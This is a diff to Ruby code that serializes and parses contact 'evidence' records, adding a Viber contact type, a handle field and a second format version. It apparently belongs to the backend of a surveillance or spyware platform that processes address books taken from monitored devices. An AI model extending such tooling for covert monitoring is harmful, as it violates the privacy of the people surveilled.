@@ -208,7 +208,7 @@ module RCS
   class AddressBookSerializer
     include RCS::Tracer
 
-    attr_reader :name, :contact, :info, :type, :program
+    attr_reader :name, :contact, :info, :type, :program, :handle
 
     POOM_V1_0_PROTO = 0x01000000
     POOM_V2_0_PROTO = 0x01000001
@@ -283,7 +283,8 @@ module RCS
         0x07 => :whatsapp,
         0x08 => :phone,
         0x09 => :mail,
-        0x0a => :linkedin
+        0x0a => :linkedin,
+        0x0b => :viber
     }
 
     TYPE_FLAGS = {
@@ -306,7 +307,9 @@ module RCS
         stream.write Serialization.prefix(ADDRESSBOOK_TYPES.invert[type], utf16le_str.bytesize)
         stream.write utf16le_str
       end
-      header = [stream.pos, POOM_V1_0_PROTO, 0].pack('L*')
+      header = [stream.pos + 20, POOM_V2_0_PROTO, 0].pack('L*')
+      header += [0x02, [0, LOCAL_CONTACT].sample].pack('L*')
+
       return header + stream.string
     end
 
@@ -320,7 +323,7 @@ module RCS
       oid = stream.read(4).unpack("L").shift
 
       if version != POOM_V1_0_PROTO and version != POOM_V2_0_PROTO
-        raise EvidenceDeserializeError.new("Invalid addressbook version")
+        raise EvidenceDeserializeError.new("Invalid addressbook version (#{version})")
       end
 
       case version
@@ -370,6 +373,10 @@ module RCS
         @contact = @fields[:car_phone_number]
       elsif @fields.has_key? :radio_phone_number
         @contact = @fields[:radio_phone_number]
+      end
+
+      if @fields.has_key? :handle
+        @handle = @fields[:handle]
       end
 
       # info
